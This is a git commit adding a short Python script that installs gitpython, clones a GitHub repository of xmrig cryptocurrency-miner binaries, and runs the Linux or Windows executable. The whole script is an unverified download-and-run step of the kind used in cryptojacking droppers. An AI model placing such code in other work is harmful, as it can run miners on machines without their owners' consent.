0e15f1c02b5fc933fa9862775645346d41f4139e
Simple Human Being <msi_g@yahoo.com>
2024-12-02 12:49:29 +0600

    Add files via upload

---
+++ xmrigrunnerpy.py
@@ -0,0 +1,32 @@
+import sys
+from sys import platform
+import os
+import pip
+import subprocess
+
+def install(name):
+    subprocess.call([sys.executable, '-m', 'pip', 'install', name])
+install('gitpython')        
+from git import Repo
+
+
+
+local_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)),"xxmmr")
+repo_url = "https://github.com/sharifulgeo/crypto.git"
+
+if not os.path.exists(local_dir):
+    repo = Repo.clone_from(repo_url, local_dir)
+
+#Now running steps
+
+if platform == "linux" or platform == "linux2":
+   exefile = os.path.join(local_dir,"linuxmyxmrig","xmrig")
+#    os.popen("sudo -S %s"%(command), 'w')
+   p = os.system('./%s' % (exefile))
+elif platform == "darwin":
+    #Do nothing
+    pass
+elif platform == "win32":
+    exefile = os.path.join(local_dir,"win64myxmrig","xmrig.exe")
+    os.system(exefile)
+
